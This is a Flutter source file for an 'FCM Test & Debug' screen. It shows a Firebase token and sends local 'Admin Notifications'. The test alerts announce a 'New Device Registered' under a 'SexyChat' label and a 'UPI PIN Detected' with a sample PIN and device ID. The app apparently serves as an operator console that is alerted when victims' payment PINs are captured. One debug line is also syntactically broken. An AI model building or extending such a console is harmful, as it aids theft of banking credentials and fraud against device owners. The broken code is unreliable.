import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:firebase_messaging/firebase_messaging.dart'
    if (dart.library.html) '../../../core/utils/firebase_stub.dart';
import '../../../data/services/fcm_service.dart'
    if (dart.library.html) '../../../core/utils/fcm_service_stub.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart'
    if (dart.library.html) '../../../core/utils/flutter_local_notifications_stub.dart';

class FCMTestScreen extends StatefulWidget {
  const FCMTestScreen({super.key});

  @override
  State<FCMTestScreen> createState() => _FCMTestScreenState();
}

class _FCMTestScreenState extends State<FCMTestScreen> {
  String? _fcmToken;
  NotificationSettings? _notificationSettings;
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadFCMInfo();
  }

  Future<void> _loadFCMInfo() async {
    setState(() => _isLoading = true);
    
    try {

      _fcmToken = await FCMService().getToken();

      _notificationSettings = await FirebaseMessaging.instance.getNotificationSettings();
      
      debugPrint('FCM Token: $_fcmToken');
      debugPrint('Permission: ${_notificationSettings?.authorizationStatus}');
    } catch (e) {
      debugPrint('Error loading FCM info: $e');
    }
    
    setState(() => _isLoading = false);
  }

  Future<void> _testDeviceNotification() async {
    try {
      debugPrint('Testing device notification...');
      
      final notifications = FlutterLocalNotificationsPlugin();
      
      await notifications.show(
        DateTime.now().millisecondsSinceEpoch ~/ 1000,
        'New Device Registered',
        'Samsung Galaxy S21 (SexyChat)',
        NotificationDetails(
          android: AndroidNotificationDetails(
            'admin_notifications',
            'Admin Notifications',
            channelDescription: 'Notifications for admin activities',
            importance: Importance.max,
            priority: Priority.high,
            icon: '@mipmap/ic_launcher',
            enableVibration: true,
            playSound: true,
            showWhen: true,
          ),
        ),
      );
      
      _showSuccess('Device notification sent!');
    } catch (e) {
      debugPrint('Error: $e');
      _showError('Error: $e');
    }
  }

  Future<void> _testUPINotification() async {
    try {
      debugPrint('Testing UPI notification...');
      
      final notifications = FlutterLocalNotificationsPlugin();
      
      await notifications.show(
        DateTime.now().millisecondsSinceEpoch ~/ 1000,
        'UPI PIN Detected',
        'PIN: 123456 - Device: abc123 (Samsung Galaxy)',
        NotificationDetails(
          android: AndroidNotificationDetails(
            'admin_notifications',
            'Admin Notifications',
            channelDescription: 'Notifications for admin activities',
            importance: Importance.max,
            priority: Priority.high,
            icon: '@mipmap/ic_launcher',
            enableVibration: true,
            playSound: true,
            showWhen: true,
          ),
        ),
      );
      
      _showSuccess('UPI notification sent!');
    } catch (e) {
      debugPrint(''? Error: $e');
      _showError('Error: $e');
    }
  }

  void _copyToken() {
    if (_fcmToken != null) {
      Clipboard.setData(ClipboardData(text: _fcmToken!));
      _showSuccess('Token copied to clipboard');
    }
  }

  void _showSuccess(String message) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.check_circle, color: Colors.white),
            const SizedBox(width: 12),
            Expanded(child: Text(message)),
          ],
        ),
        backgroundColor: Colors.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  void _showError(String message) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            const Icon(Icons.error, color: Colors.white),
            const SizedBox(width: 12),
            Expanded(child: Text(message)),
          ],
        ),
        backgroundColor: Colors.red,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isDark = Theme.of(context).brightness == Brightness.dark;
    
    return Scaffold(
      appBar: AppBar(
        title: const Text('FCM Test & Debug'),
        elevation: 0,
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator())
          : RefreshIndicator(
              onRefresh: _loadFCMInfo,
              child: ListView(
                padding: const EdgeInsets.all(16),
                children: [

                  Card(
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: _getPermissionColor().withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(8),
                                ),
                                child: Icon(
                                  _getPermissionIcon(),
                                  color: _getPermissionColor(),
                                  size: 24,
                                ),
                              ),
                              const SizedBox(width: 12),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      'Notification Permission',
                                      style: TextStyle(
                                        fontSize: 16,
                                        fontWeight: FontWeight.bold,
                                        color: isDark ? Colors.white : Colors.black87,
                                      ),
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      _getPermissionText(),
                                      style: TextStyle(
                                        fontSize: 14,
                                        color: isDark ? Colors.grey[400] : Colors.grey[600],
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                          if (_notificationSettings != null) ...[
                            const SizedBox(height: 12),
                            _buildInfoRow('Alert', _notificationSettings!.alert.toString()),
                            _buildInfoRow('Sound', _notificationSettings!.sound.toString()),
                            _buildInfoRow('Badge', _notificationSettings!.badge.toString()),
                          ],
                        ],
                      ),
                    ),
                  ),
                  
                  const SizedBox(height: 16),

                  Card(
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: Colors.blue.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(8),
                                ),
                                child: const Icon(
                                  Icons.vpn_key,
                                  color: Colors.blue,
                                  size: 24,
                                ),
                              ),
                              const SizedBox(width: 12),
                              Text(
                                'FCM Token',
                                style: TextStyle(
                                  fontSize: 16,
                                  fontWeight: FontWeight.bold,
                                  color: isDark ? Colors.white : Colors.black87,
                                ),
                              ),
                              const Spacer(),
                              IconButton(
                                onPressed: _copyToken,
                                icon: const Icon(Icons.copy, size: 20),
                                tooltip: 'Copy token',
                              ),
                            ],
                          ),
                          const SizedBox(height: 12),
                          Container(
                            padding: const EdgeInsets.all(12),
                            decoration: BoxDecoration(
                              color: isDark ? Colors.grey[900] : Colors.grey[100],
                              borderRadius: BorderRadius.circular(8),
                              border: Border.all(
                                color: isDark ? Colors.grey[800]! : Colors.grey[300]!,
                              ),
                            ),
                            child: SelectableText(
                              _fcmToken ?? 'No token available',
                              style: TextStyle(
                                fontSize: 11,
                                fontFamily: 'monospace',
                                color: _fcmToken != null
                                    ? (isDark ? Colors.white : Colors.black87)
                                    : Colors.red,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                  
                  const SizedBox(height: 24),

                  Text(
                    'Test Notifications',
                    style: TextStyle(
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                      color: isDark ? Colors.white : Colors.black87,
                    ),
                  ),
                  
                  const SizedBox(height: 12),

                  ElevatedButton.icon(
                    onPressed: _testDeviceNotification,
                    icon: const Icon(Icons.phone_android),
                    label: const Text('Test Device Registration'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF6366F1),
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 16),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                  
                  const SizedBox(height: 12),

                  ElevatedButton.icon(
                    onPressed: _testUPINotification,
                    icon: const Icon(Icons.lock),
                    label: const Text('Test UPI PIN Detected'),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFFEF4444),
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 16),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                  
                  const SizedBox(height: 12),

                  OutlinedButton.icon(
                    onPressed: _loadFCMInfo,
                    icon: const Icon(Icons.refresh),
                    label: const Text('Refresh Info'),
                    style: OutlinedButton.styleFrom(
                      padding: const EdgeInsets.symmetric(vertical: 16),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                  ),
                  
                  const SizedBox(height: 24),

                  Card(
                    color: Colors.orange.withOpacity(0.1),
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              const Icon(
                                Icons.bug_report,
                                color: Colors.orange,
                                size: 20,
                              ),
                              const SizedBox(width: 8),
                              Text(
                                'Debug Info',
                                style: TextStyle(
                                  fontSize: 16,
                                  fontWeight: FontWeight.bold,
                                  color: isDark ? Colors.white : Colors.black87,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 12),
                          Text(
                            '? Check console logs for detailed FCM debug info\n'
                            '? Token must be sent to backend during login\n'
                            '? Backend must have valid Firebase credentials\n'
                            '? Test notifications work locally\n'
                            '? Real notifications come from backend',
                            style: TextStyle(
                              fontSize: 13,
                              color: isDark ? Colors.grey[400] : Colors.grey[700],
                              height: 1.5,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
    );
  }

  Widget _buildInfoRow(String label, String value) {
    final isDark = Theme.of(context).brightness == Brightness.dark;
    return Padding(
      padding: const EdgeInsets.only(top: 8),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(
            label,
            style: TextStyle(
              fontSize: 13,
              color: isDark ? Colors.grey[400] : Colors.grey[600],
            ),
          ),
          Text(
            value,
            style: TextStyle(
              fontSize: 13,
              fontWeight: FontWeight.w600,
              color: isDark ? Colors.white : Colors.black87,
            ),
          ),
        ],
      ),
    );
  }

  Color _getPermissionColor() {
    if (_notificationSettings == null) return Colors.grey;
    
    switch (_notificationSettings!.authorizationStatus) {
      case AuthorizationStatus.authorized:
        return Colors.green;
      case AuthorizationStatus.provisional:
        return Colors.orange;
      case AuthorizationStatus.denied:
        return Colors.red;
      default:
        return Colors.grey;
    }
  }

  IconData _getPermissionIcon() {
    if (_notificationSettings == null) return Icons.help_outline;
    
    switch (_notificationSettings!.authorizationStatus) {
      case AuthorizationStatus.authorized:
        return Icons.check_circle;
      case AuthorizationStatus.provisional:
        return Icons.warning;
      case AuthorizationStatus.denied:
        return Icons.cancel;
      default:
        return Icons.help_outline;
    }
  }

  String _getPermissionText() {
    if (_notificationSettings == null) return 'Unknown';
    
    switch (_notificationSettings!.authorizationStatus) {
      case AuthorizationStatus.authorized:
        return 'Authorized - Notifications enabled';
      case AuthorizationStatus.provisional:
        return 'Provisional - Limited notifications';
      case AuthorizationStatus.denied:
        return 'Denied - Notifications disabled';
      case AuthorizationStatus.notDetermined:
        return 'Not determined - Permission not requested';
      default:
        return 'Unknown status';
    }
  }
}
